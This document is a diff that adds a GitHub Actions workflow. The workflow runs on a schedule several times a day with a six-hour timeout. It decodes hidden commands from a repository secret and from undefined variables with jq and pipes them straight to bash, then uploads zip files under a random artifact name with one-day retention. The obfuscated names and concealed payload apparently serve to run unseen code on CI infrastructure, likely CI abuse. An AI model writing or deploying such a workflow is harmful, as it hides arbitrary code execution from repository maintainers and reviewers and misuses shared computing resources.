@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          tt5: ${{ secrets.tt5 }}
+        run: |
+          printf '%s' "$tt5" | jq -r .yr65 | /bin/bash
+          echo $zzc684 | jq -r .h5 | /bin/bash
+          printf '%s' "$fyc12" | jq -r .xof7726 | /bin/bash
+          echo $e7 | jq -r .qpq60604 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bRgLPVJq
+          path: "*.zip"
+          retention-days: 1
